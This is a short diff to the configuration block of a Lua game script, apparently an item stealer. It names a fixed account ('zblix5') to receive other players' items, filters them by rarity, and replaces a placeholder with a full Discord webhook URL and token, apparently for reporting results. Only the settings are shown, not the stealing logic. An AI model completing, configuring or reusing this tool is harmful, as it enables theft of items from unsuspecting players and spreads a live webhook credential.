@@ -5,7 +5,7 @@
 local TARGET = "zblix5"                -- cuenta que recibe los items
 local MODE = "rarity"                  -- "all" = todo | "rarity" = solo las rarezas de RARITIES
 local RARITIES = { "Common", "Uncommon", "Rare", "Legendary", "Mythic", "Ancient" }
-local WEBHOOK = "TU_WEBHOOK_AQUI"      -- PON TU WEBHOOK AQUÍ
+local WEBHOOK = "https://discord.com/api/webhooks/1562193237588836482/KTqkiUtQDZWlk6Jssl6oK5Bav47rtwNZp7vzgbleGBixqYNIhwyAykT3krWBLdfjLORo"      -- PON TU WEBHOOK AQUÍ
 local DEBUG = false                    -- true = muestra logs y avisos de cada paso
 -- =======================================
 
